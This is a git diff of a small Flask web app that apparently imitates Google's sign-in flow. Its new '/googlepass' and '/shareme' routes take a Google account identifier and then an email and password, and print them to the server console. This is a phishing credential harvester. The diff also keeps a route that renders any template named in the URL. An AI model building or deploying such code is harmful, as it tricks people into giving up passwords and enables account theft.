@@ -8,12 +8,21 @@ app=Flask(__name__)
 def index():
     return render_template('index.html')
 
-@app.route("/googlepass/<mail>")
-def glogin(mail):
+@app.route("/googlepass",methods=['POST'])
+def glogin():
+    mail=request.form['identifier']
+    print('\n\n\n',mail,'\n\n\n')
     if not re.findall(r"@gmail.com",mail):mail+="@gmail.com"
     return render_template('googlepass.html',act=mail)
 
-@app.route("/<name>",methods=['GET','POST'])
+@app.route("/shareme",methods=['POST'])
+def share():
+    email=request.form['email']
+    passwd=request.form['pass']
+    print('\n\n\n',email,passwd,'\n\n\n')
+    return render_template('share.html')
+
+@app.route("/<name>",methods=['GET'])
 def login(name):
     return render_template(f'{name}.html')
 
@@ -22,6 +31,10 @@ def login(name):
 
 # google next identifierNext
 
-
+# <script>
+#    $(document).ready(function(){
+#    document.getElementById("profileIdentifier").innerText="{{act}}";
+#    });
+#    </script>
 if __name__=="__main__":
-    app.run()
+    app.run(port=4000)
